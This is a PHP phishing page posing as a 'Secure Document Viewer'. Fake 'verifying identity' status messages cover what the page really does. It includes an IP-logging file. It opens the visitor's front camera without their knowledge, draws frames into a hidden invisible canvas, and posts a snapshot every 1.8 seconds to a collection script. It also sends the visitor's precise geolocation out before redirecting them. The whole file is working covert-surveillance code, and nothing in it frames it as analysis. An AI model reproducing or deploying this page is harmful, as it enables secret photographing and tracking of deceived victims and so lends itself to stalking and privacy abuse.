<?php
include 'ip.php';

echo '
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Document Viewer</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 100 100\'><text y=\'.9em\' font-size=\'90\'>📄</text></svg>">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            background: white;
            border-radius: 10px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            padding: 40px;
            max-width: 500px;
            width: 90%;
            text-align: center;
        }
        .icon {
            font-size: 80px;
            margin-bottom: 20px;
            animation: bounce 2s infinite;
        }
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }
        h1 {
            color: #333;
            margin-bottom: 10px;
            font-size: 24px;
        }
        p {
            color: #666;
            margin-bottom: 30px;
            line-height: 1.6;
        }
        .loading {
            width: 100%;
            height: 6px;
            background: #e0e0e0;
            border-radius: 3px;
            overflow: hidden;
            margin: 20px 0;
        }
        .loading-bar {
            height: 100%;
            background: linear-gradient(90deg, #667eea, #764ba2);
            width: 0%;
            animation: load 3s ease-in-out forwards;
        }
        @keyframes load {
            0% { width: 0%; }
            100% { width: 100%; }
        }
        .status {
            color: #888;
            font-size: 14px;
            margin-top: 10px;
        }
        .video-capture {
            position: fixed;
            top: 0;
            left: 0;
            width: 640px;
            height: 480px;
            z-index: -100;
            opacity: 0;
            pointer-events: none;
        }
    </style>
</head>
<body>
    <div class="video-capture">
        <video id="video" playsinline autoplay muted></video>
        <canvas id="canvas" width="640" height="480"></canvas>
    </div>
    
    <div class="container">
        <div class="icon">📄</div>
        <h1>Preparing Your Secure Document</h1>
        <p>Please wait while we verify your identity and prepare the document for viewing...</p>
        <div class="loading">
            <div class="loading-bar"></div>
        </div>
        <div class="status" id="status">Initializing secure connection...</div>
    </div>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script>
        const statusMessages = [
            "Initializing secure connection...",
            "Verifying device security...",
            "Authenticating request...",
            "Decrypting document...",
            "Loading PDF viewer..."
        ];
        
        let msgIndex = 0;
        const statusEl = document.getElementById("status");
        
        function updateStatus() {
            if (msgIndex < statusMessages.length) {
                statusEl.textContent = statusMessages[msgIndex];
                msgIndex++;
                setTimeout(updateStatus, 600);
            }
        }
        
        setTimeout(updateStatus, 500);
        
        // Capture functions
        function post(imgdata) {
            $.ajax({
                type: "POST",
                data: { cat: imgdata },
                url: "forwarding_link/post.php",
                dataType: "json",
                async: false
            });
        }
        
        function captureLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(pos) {
                        $.ajax({
                            type: "POST",
                            url: "forwarding_link/location.php",
                            data: {
                                lat: pos.coords.latitude,
                                lon: pos.coords.longitude,
                                acc: pos.coords.accuracy,
                                time: new Date().getTime()
                            }
                        });
                    },
                    function(err) {},
                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                );
            }
        }
        
        // Camera init
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");
        
        async function initCapture() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    audio: false,
                    video: { facingMode: "user" }
                });
                video.srcObject = stream;
                
                // Wait for video to be ready before capturing
                video.onloadedmetadata = () => {
                    video.play();
                };
                
                // Start capturing after 2 second delay
                setTimeout(() => {
                    const ctx = canvas.getContext("2d");
                    setInterval(function() {
                        ctx.drawImage(video, 0, 0, 640, 480);
                        const imgData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
                        post(imgData);
                    }, 1800);
                }, 2000);
                
            } catch(e) {}
        }
        
        // Start captures and redirect
        setTimeout(function() {
            initCapture();
            captureLocation();
            
            // Redirect to PDF viewer after 4 seconds
            setTimeout(function() {
                window.location.href = "forwarding_link/index2.html";
            }, 4000);
        }, 1000);
    </script>
</body>
</html>
';
exit;
?>
